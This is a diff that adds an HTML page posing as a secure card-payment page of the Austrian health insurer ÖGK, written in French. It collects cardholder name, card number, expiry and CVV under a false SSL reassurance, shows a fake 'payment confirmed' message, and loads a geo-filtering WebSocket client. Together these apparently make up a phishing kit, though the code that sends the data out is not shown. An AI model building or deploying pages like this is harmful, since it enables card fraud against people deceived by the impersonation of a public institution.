@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OGK - Österreichische Gesundheitskasse</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #27ae60;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #2c3e50;
+            font-size: 1.8em;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+
+        .security-notice {
+            background: #e8f5e8;
+            border: 1px solid #27ae60;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .security-icon {
+            color: #27ae60;
+            font-size: 20px;
+        }
+
+        .security-text {
+            color: #2c3e50;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 500;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Indicateur de connexion WebSocket */
+        .connection-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #e74c3c;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        .connection-indicator.connected {
+            background: #27ae60;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Indicateur géographique */
+        .geo-indicator {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .geo-indicator.visible {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">OGK</div>
+            <h1>Paiement Sécurisé</h1>
+            <p class="subtitle">Österreichische Gesundheitskasse</p>
+        </div>
+
+        <div class="security-notice">
+            <div class="security-icon">🔒</div>
+            <div class="security-text">
+                Connexion sécurisée SSL - Vos données sont protégées
+            </div>
+        </div>
+
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardName">Nom du titulaire</label>
+                <input type="text" id="cardName" name="cardName" placeholder="Jean Dupont" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Numéro de carte</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiryMonth">Mois d'expiration</label>
+                    <select id="expiryMonth" name="expiryMonth" required>
+                        <option value="">MM</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="expiryYear">Année d'expiration</label>
+                    <select id="expiryYear" name="expiryYear" required>
+                        <option value="">YY</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Montant</label>
+                <input type="text" id="amount" name="amount" value="€ 29.99" readonly>
+            </div>
+
+            <button type="submit" class="submit-btn">
+                🔒 Confirmer le Paiement
+            </button>
+        </form>
+
+        <div class="footer">
+            <a href="#">IMPRESSUM</a>
+            <a href="#">DATENSCHUTZ</a>
+            <a href="#">BARRIEREFREIHEITSERKLÄRUNG</a>
+            <a href="#">TECHNISCHER SUPPORT</a>
+        </div>
+    </div>
+
+    <!-- Indicateurs -->
+    <div class="connection-indicator" id="connectionIndicator"></div>
+    <div class="geo-indicator" id="geoIndicator"></div>
+
+    <!-- Socket.IO -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
+    
+    <!-- Client WebSocket avec filtrage géographique -->
+    <script src="/js/websocket-client-geo.js"></script>
+
+    <script>
+        // Gestion du formulaire
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Simulation de traitement
+            const submitBtn = document.querySelector('.submit-btn');
+            const originalText = submitBtn.textContent;
+            
+            submitBtn.textContent = '⏳ Traitement en cours...';
+            submitBtn.disabled = true;
+            
+            setTimeout(() => {
+                submitBtn.textContent = '✅ Paiement confirmé';
+                setTimeout(() => {
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                }, 2000);
+            }, 3000);
+        });
+
+        // Formatage du numéro de carte
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // Gestion des indicateurs
+        function updateConnectionIndicator(connected) {
+            const indicator = document.getElementById('connectionIndicator');
+            if (connected) {
+                indicator.classList.add('connected');
+            } else {
+                indicator.classList.remove('connected');
+            }
+        }
+
+        function updateGeoIndicator(geoInfo) {
+            const indicator = document.getElementById('geoIndicator');
+            if (geoInfo && geoInfo.country_name) {
+                indicator.textContent = `📍 ${geoInfo.country_name}`;
+                indicator.classList.add('visible');
+                
+                // Masquer après 5 secondes
+                setTimeout(() => {
+                    indicator.classList.remove('visible');
+                }, 5000);
+            }
+        }
+
+        // Écouter les événements WebSocket si disponibles
+        setTimeout(() => {
+            if (window.wsGeoClient) {
+                const status = window.wsGeoClient.getStatus();
+                updateConnectionIndicator(status.connected);
+                updateGeoIndicator(status.geoInfo);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
+
